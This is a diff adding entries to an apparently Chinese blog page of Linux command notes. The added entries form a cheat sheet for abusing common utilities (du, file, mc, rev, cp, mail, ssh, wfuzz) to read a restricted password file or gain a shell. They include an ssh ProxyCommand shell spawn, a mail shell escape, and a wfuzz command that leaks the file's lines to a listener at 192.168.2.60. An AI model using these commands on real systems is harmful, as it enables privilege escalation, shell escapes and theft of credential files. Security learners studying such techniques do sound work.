@@ -102,6 +102,37 @@ wc（word count）命令是Linux中常用于计算文件的行数、字数和字
 利用</p>
 <pre class="notranslate"><code class="notranslate">		  sd -p a b /etc/passwd
 			  -p指定预览模式不会对文件做出修改，打印出替换后的结果到终端
+</code></pre>
+<p>4.du命令</p>
+<pre class="notranslate"><code class="notranslate">		du --files0-from=password.txt
+</code></pre>
+<p>5.file命令</p>
+<pre class="notranslate"><code class="notranslate">		file -f password.txt
+</code></pre>
+<p>6.mc命令</p>
+<pre class="notranslate"><code class="notranslate">		mc -v/-e password.txt
+</code></pre>
+<p>7.ssh命令</p>
+<pre class="notranslate"><code class="notranslate">		ssh -o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' x
+</code></pre>
+<p>8.rev命令</p>
+<pre class="notranslate"><code class="notranslate">		rev password.txt
+		实际上不修改文件内容展示反转后的内容
+</code></pre>
+<p>9.cp命令</p>
+<p>cp命令在创建文件时会保留源文件的属组和权限，但是如果覆盖文件则是保留覆盖文件的属组和权限</p>
+<pre class="notranslate"><code class="notranslate">		touch /tmp/test
+		chmod 777 /tmp/test
+		cp password.txt /tmp/test 
+</code></pre>
+<p>10.mail命令</p>
+<pre class="notranslate"><code class="notranslate">		mail -f password.txt
+		&amp; !cat password.txt
+		执行命令
+</code></pre>
+<p>11.wfuzz<br>
+将文件视作字典来读，kali开放端口查看响应即可</p>
+<pre class="notranslate"><code class="notranslate">wfuzz -c -v -z file,/home/user9/password.txt http://192.168.2.60:81/FUZZ
 </code></pre></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
